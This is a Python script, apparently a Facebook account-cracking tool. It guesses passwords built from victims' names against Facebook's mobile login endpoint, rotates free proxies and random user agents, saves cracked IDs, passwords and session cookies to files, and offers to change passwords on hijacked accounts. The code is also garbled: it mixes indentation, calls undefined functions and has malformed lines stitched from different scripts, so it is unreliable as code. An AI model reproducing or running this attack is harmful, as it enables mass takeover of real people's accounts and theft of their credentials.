# code by Yayan XD
# my facebook ( https://www.facebook.com/KM39453 )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Yayan XD.

import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
waktu = '%s %s %s'%(ha,op,ta)
waktu.split('/')
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
############################ RESPONSE FACEBOOK ###########################################
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,pwBaru=[],[]
Apk = []
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']
#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']
###########################################################################################
hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"
dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"
aaaa, bbbb, cccc = "tools", "debug", "accesstoken"
#bahasa = "en-GB,en-US;q=0.9,en;q=0.8"
bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
#bahasa = "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
###########################################################################################
## RANDOM UA
#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
# lempankkkkkkkk
ugen2=[]
ugen=[]

try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
     
def mentod():
    print('%s══════════════════════════════════════════\n %sMETHOD MENU%s'%(N,BM,N))
    print(' %s[%s1%s] Method 1 free (%sRecommended%s)'%(N,H,N,H,N))
    print(' [%s2%s] Method 2 mbasic (%sRecommended%s)'%(H,N,H,N))
    print(' [%s3%s] Method 3 mobile (%sRecommended%s)'%(H,N,H,N))
#-------- LOADING ANIMASI ------------
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
# LOGO
def logo():
    print("""\n
\033[1;92m    _          _
\033[1;92m     \\        /
\033[1;92m    __\\______/__
\033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
 \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m Black Gold          \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGorup Fb  :  \033[1;92m Termux Command World\033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m█
\033[1;92m╚═════════════════════════════════════════╝""")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By James Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(H,H,H,H,str(len(ok)),H))
        print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(H,H,H,str(len(cp)),H))
        cek_cp = input(f"{H}══════════════════════════════════════════\n [{H}+{H}] Show CP detector options [{H}Y{N}/{M}t{N}]: ")
        if cek_cp =="":
            print(f"\n [{M}!{N}] Don't be empty");hasil(ok,cp)
        elif cek_cp in["Y","y"]:
            jalan(f" {N}[{M}!{N}] Play airplanemode first");time.sleep(5)
            ww=input(f"\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: ")
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}james123{N}")
                pwBar=input(f" {N}[{K}?{N}] Enter new password : {H}")
                #print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[JAMES-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[JAMES-CP] ", ""), titid[1])
                except requests.exceptions.ConnectionError:
                    continue
                    print("")
            print("")
            jalan(' %s[%s✓%s] %sChecking process is complete%s'%(N,H,N,H,N))
            jalan(' %s[%s✓%s] Retrun SC type "%spython UserCrack.py%s"'%(N,H,N,H,N));exit()
        elif cek_cp in["T","t"]:
            jalan(f"\n {N}[{H}•{N}] {N}Ok, thank you. Retrun SC type '{H}python UserCrack.py{N}'");exit()
        else:
            print(f"\n {N}[{M}!{N}] Choose Y/t");hasil(ok,cp)
    else:
        jalan('\n\n %s[%s!%s] Sorry you didnt get results'%(N,M,N));exit()



def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r 🎮  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
#METODE LOGIN
### MENU UTAMA ###
def file():
            logo()
            print('')
            print("\033[1;92m [01] File Clone ")
            key = input("\n [+] Select One : ")
            if key in [""]:
                print(" [!] please select correct option")
                exit()
            elif key in ["1", "01"]:
                __chigoue__().chi(id)

# MULAI CRACK
class __chigoue__:
    def __init__(self):
        self.id = []
    def chi(self, id):
        os.system("clear")
        logo()
        crot = input(f" {H}[{H}+{H}] Want to show related apps [{H}y{H}/{H}t{H}]: ")
        if crot in[""]:
            print(f" {N}[{M}×{N}] Don't be empty");__chigoue__().chi(id)
        elif crot in["Y","y"]:
            Apk.append("y")
        elif crot in["T","t"]:
            Apk.append("t")
        else:
            #jalan(f" {N}[{M}×{N}] Sorry, wrong username");self.tampilkan_apk()
            print(f" {H}[{H}×{H}] Select Between y/t");__chigoue__().chi(id)
        self.cnt = input('\033[1;92m[+] Enter File Name :\033[1;92m ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        ___two___ = ('y')
        if ___two___ in ('yes', 'Yes', 'Y', 'y'):
#            self.__ok__()
            self.__pler__()
        else:
            print(' [!] Choose Correct One')
            self.chi(id)

def setting():
	os.system('clear')
	banner()
	print('')
etak(nel('[bold green]➣1. CLONE JUST OLD IDZ \n➣2. CLONE JUST NEW IDZ=>RECOMEND \n➣3. CLONE MIX IDZ (NEW/OLD)=>RECOMEND [bold green]'))
print('')
	hu = input('=>CHOOSE : ')
	if hu in ('1', '01'):
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ('2', '02'):
		muda = []
		for bacot in sorted(id):
			muda.append(bacot)
		bcm = len(muda)
		bcmi = bcm - 1
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -= 1
	elif hu in ('3', '03'):
		for bacot in id:
			xx = random.randint(0, len(id2))
			id2.insert(xx, bacot)
	else:
		print('=>TRY AGAIN')
		exit()
	os.system('clear')
	banner()
    print('')
    cetak(nel('[bold green]➣1. MOBILE \x1b[1;91m[SLOW]\n➣2. MBASIC \x1b[1;92m[VERY FIRST]\n➣3. TOUCH \x1b[1;91m [SLOW]\n➣4. MTOUCH \x1b[1;91m[SLOW] [bold green]'))
    print('')
    hc = input('>> CHOOSE : ')
	if hc in ('1', '01'):
        method.append('mobile')
	elif hc in ('2', '02'):
		method.append('mobile')
	elif hc in ('3', '03'):
		method.append('mobile')
	elif hc in ('4', '04'):
		method.append('mbasic')
	else:
		method.append('mobile')
	os.system('clear')
	banner()
	print('')
  _jembot_ = input('\x1b[1;92m=>SHOW APKS ( Y/t ) ')
	pwplus = input('=>\x1b[1;92mPASWORD MENU MENUAL(CHOISE)/DEFULT(AUTO)( M/D ) ')
	if pwplus in ('y', 'Y'):
		pwpluss.append('ya')
		cetak(nel('[[purple]•[yellow]] ADD PASWORD MXM 6 WORDS\n[[purple]•[yellow]] EXIMPLE :[green] 556677,786786,123456[purple] '))
		pwku = input('#=>Add PASSWORDS : ')
		pwkuh = pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit()

def complete():
	print('')
	print('%s══════════════════════════════════════════' % N)
	print('\x1b[1;92mSCANNING COMPLETE')
	print('\x1b[1;92m💚TOTAL ID : ' + str(len(id)))
	print('\x1b[1;92m💚TOTAL OK : ' + str(ok))
	print('\x1b[1;91m❤️TOTAL CP : ' + str(cp))
	print('%s══════════════════════════════════════════' % N)

def passwrd():
	os.system('clear')
	banner()
	print('\x1b[1;92m══════════════════════════════════════════')
	print('👉\x1b[1;92mYOUR CLONEING STARTED')
	print('👉\x1b[1;92mTOTAL IDZ : ' + str(len(id)))
	print('👉\x1b[1;92mYOUR OK ID SAVED: rr_ok.txt')
	print('👉\x1b[1;91mYOUR CP ID SAVED: rr_cp.txt')
	print('👉\x1b[1;92mYOUR CLONING STOP PRESS CTRL THAN Z')
	print('\x1b[1;92m══════════════════════════════════════════')
	print('')
	with tred(30, **('max_workers',)) as pool:
		for yuzong in id2:
			idf = yuzong.split('|')[0]
			nmf = yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf) < 6:
				if len(frs) < 3:
					pass
				else:
					pwv.append(frs + '123')
					pwv.append(frs + '1234')
					pwv.append(frs + '12345')
					pwv.append(frs + '1122')
			elif len(frs) < 3:
				pwv.append(nmf)
			else:
				pwv.append(nmf)
				pwv.append(frs + '123')
				pwv.append(frs + '1234')
				pwv.append(frs + '12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			if 'mobile' in method:
				pool.submit(crack, idf, pwv)
			elif 'free' in method:
				pool.submit(crack, idf, pwv)
			elif 'touch' in method:
				pool.submit(crack, idf, pwv)
			elif 'mbasic' in method:
				pool.submit(crack, idf, pwv)
			else:
				pool.submit(crack, idf, pwv)
	print('')
	complete()

def crack(idf, pwv):
	global cp, ok, loop
	bo = random.choice([m, k, h, b, u, x])
	(sys.stdout.write(f"\r{b}RR_CRACK{P} [{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),)
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip = random.choice(prox)
			proxs = {'http': 'socks4://' + nip}
			ses.headers.update({'Host': 'm.facebook.com','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/','accept-encoding': 'gzip, deflate br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),'uid': idf,'next': 'https://p.facebook.com/login/save-device/','flow': 'login_no_pin','pass': pw}
			koki = ';'.join(['%s=%s' % (key, value) for key, value in p.cookies.get_dict().items()])
			koki += ' m_pixel_ratio=2.625; wd=412x756'
			heade = {'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': 'empty','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, cookies={'cookie': koki}, headers=heade, allow_redirects=False, proxies=proxs)
			if 'checkpoint' in po.cookies.get_dict().keys():
				print('')
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mRR_CP🥀')
				print(f"\x1b[1;91m[✓] USER ID	   : {idf}\n\x1b[1;91m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				print(f"\r{ua}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				print('')
				open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
				open('RR_CP.txt', 'a').write(idf + '|' + pw + '\n')
				akun.append(idf + '|' + pw)
				cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				ok += 1
				coki = po.cookies.get_dict()
				kuki = ';'.join(['%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('')
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mRR_OK💚')
				print(f"\x1b[1;92m[✓] USER ID	   : {idf}\n\x1b[1;92m[✓] USER PASSWORD : {pw}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER COOKIES: ')
				print(f"\r{kuki}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] USER AGENT: ')
				print(f"\r{ua}{N}")
				print('\x1b[1;91m══════════════════════════════════════════')
				print('')
				open('RR_Ok.txt', 'a').write(idf + '|' + pw + '|' + ua + '\n')
				open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + ua + '\n')
				cek_apk(session, coki)
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		loop += 1
def crackfree(idf, pwv):
	global cp, ok, loop
	(sys.stdout.write(f"\r{b}RR_CRACK{P} [{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),)
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'p.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','dnt': '1','x-requested-with': 'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','sec-fetch-dest': 'document','referer': 'https://p.facebook.com/','accept-encoding': 'gzip, deflate br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),'uid': idf,'next': 'https://p.facebook.com/login/save-device/','flow': 'login_no_pin','pass': pw}
